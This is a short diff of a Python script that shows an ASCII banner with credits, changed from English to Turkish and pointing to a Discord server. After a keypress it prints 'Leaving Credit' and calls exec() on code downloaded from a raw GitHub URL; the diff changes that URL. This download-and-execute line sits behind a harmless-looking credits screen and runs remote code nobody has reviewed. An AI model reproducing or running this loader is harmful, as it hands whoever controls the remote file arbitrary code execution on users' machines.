@@ -9,10 +9,10 @@ Obfuscation = """
                                    ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
 
 
-                                 | Made By RTA (https://discord.gg/n24UMEyWgJ) |
+                                 | Rafail Tarafından Yapıldı (Discord.gg/RovaArchive) |
 
-                              Report to us if you found any invite link here not working.
-                                             Press any key to return.
+                            Herhangi bir bug/açık bulduğunuz zaman bize bildirmekten çekinmeyin!
+                                     Herhangi Bir Tuşa Basarak Geri Döne Bilirsin.
 """
 print(Obfuscation)
 while True:
@@ -20,4 +20,4 @@ while True:
     msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
-    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
+    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/main2').text)
